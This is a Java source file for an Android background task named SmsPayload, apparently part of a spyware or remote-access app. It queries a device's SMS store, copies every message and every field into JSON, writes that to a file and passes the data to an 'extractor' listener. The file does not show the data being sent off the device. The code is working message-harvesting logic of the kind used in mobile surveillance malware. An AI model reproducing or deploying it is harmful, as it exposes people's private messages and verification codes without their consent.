package com.aigs.serviceone.payload;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;

import com.aigs.serviceone.helpers.FileSystem;
import com.aigs.serviceone.helpers.SmsExtractorNotifier;
import com.aigs.serviceone.helpers.SmsModes;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.lang.ref.WeakReference;

public class SmsPayload extends AsyncTask<String, Integer, String> {

    private WeakReference<Context> contextRef;
    private SmsExtractorNotifier smsExtractorNotifier;

    public SmsPayload(Context context) {
        contextRef = new WeakReference<>(context);
    }

    public SmsPayload setSmsListener(SmsExtractorNotifier smsListener) {
        this.smsExtractorNotifier = smsListener;
        return this;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(@SmsModes String... strings) {
        Context context = contextRef.get();

        String msgData = "";

        try {
            Cursor cursor = context.getContentResolver().query(Uri.parse(strings[0]), null, null, null, null);

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                JSONArray jsonArray = new JSONArray();

                do {
                    JSONObject jsonObject = new JSONObject();
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        jsonObject.put(cursor.getColumnName(idx), cursor.getString(idx));
                    }
                    jsonArray.put(jsonObject);


                } while (cursor.moveToNext());

                File file = FileSystem.createInstance(context).smsOperationType(strings[0]).writeSmsData(jsonArray.toString());
                smsExtractorNotifier.onSmsRetrieved(file,jsonArray.toString());
            } else {
                // empty box, no SMS
                smsExtractorNotifier.onResponseEmpty();
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return msgData;
    }

    @Override
    protected void onPostExecute(String string) {
        super.onPostExecute(string);
    }
}
